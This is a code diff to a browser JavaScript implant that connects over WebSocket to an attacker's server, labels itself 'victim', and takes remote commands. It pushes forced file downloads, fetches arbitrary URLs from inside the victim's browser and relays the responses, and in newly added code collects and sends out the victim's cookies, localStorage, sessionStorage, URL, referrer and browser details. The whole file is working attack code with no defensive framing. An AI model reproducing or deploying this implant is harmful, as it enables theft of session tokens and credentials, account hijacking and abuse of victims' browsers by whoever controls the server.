@@ -1,4 +1,4 @@
-const socket = new WebSocket("wss://192.168.1.12:8443/ws");
+const socket = new WebSocket("wss://SERVER-IP:8443/ws");
 
 socket.onopen = () => {
   socket.send("victim");
@@ -7,8 +7,8 @@ socket.onopen = () => {
 
 socket.onmessage = async (event) => {
   const data = event.data;
-  
-  // Check if the message is a file transfer command
+
+  // Handle file transfer commands first.
   if (data.startsWith("file:")) {
     // Expected format: "file:filename.ext|<base64data>"
     const parts = data.split("|", 2);
@@ -29,18 +29,60 @@ socket.onmessage = async (event) => {
       const a = document.createElement("a");
       a.href = blobUrl;
       a.download = filename;
-      // Append to the document and trigger click to start download
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
       console.log(`File "${filename}" received (${blob.size} bytes) and automatically downloaded.`);
-      // Optionally, send a confirmation back via WebSocket:
       socket.send(`[FILE RECEIVED] ${filename} (${blob.size} bytes)`);
     }
     return;
   }
 
-  // Otherwise, assume the message is a URL to fetch
+  // Handle collect info command.
+  if (data.startsWith("collectinfo:")) {
+    // Expected format: "collectinfo:useragent,platform,urlref,plugins,cookies,storage"
+    const fields = data.slice("collectinfo:".length).split(",");
+    let results = {};
+    if (fields.includes("useragent")) {
+      results.useragent = navigator.userAgent;
+    }
+    if (fields.includes("platform")) {
+      results.platform = navigator.platform;
+    }
+    if (fields.includes("urlref")) {
+      results.url = window.location.href;
+      results.referrer = document.referrer;
+    }
+    if (fields.includes("plugins")) {
+      let plugins = [];
+      for (let i = 0; i < navigator.plugins.length; i++) {
+        plugins.push(navigator.plugins[i].name);
+      }
+      results.plugins = plugins;
+    }
+    if (fields.includes("cookies")) {
+      results.cookies = document.cookie;
+    }
+    if (fields.includes("storage")) {
+      let localStorageData = {};
+      for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        localStorageData[key] = localStorage.getItem(key);
+      }
+      let sessionStorageData = {};
+      for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        sessionStorageData[key] = sessionStorage.getItem(key);
+      }
+      results.localStorage = localStorageData;
+      results.sessionStorage = sessionStorageData;
+    }
+    // Send the collected information as JSON back via WebSocket.
+    socket.send(`[COLLECTED INFO] ${JSON.stringify(results)}`);
+    return;
+  }
+
+  // Otherwise, assume the message is a URL to fetch.
   try {
     const res = await fetch(data);
     if (res.status >= 200 && res.status < 500) {
@@ -49,6 +91,6 @@ socket.onmessage = async (event) => {
       socket.send(`[📄] Body Preview:\n${text.slice(0, 1000)}\n---`);
     }
   } catch (err) {
-    // Fail silently
+    // Fail silently.
   }
 };
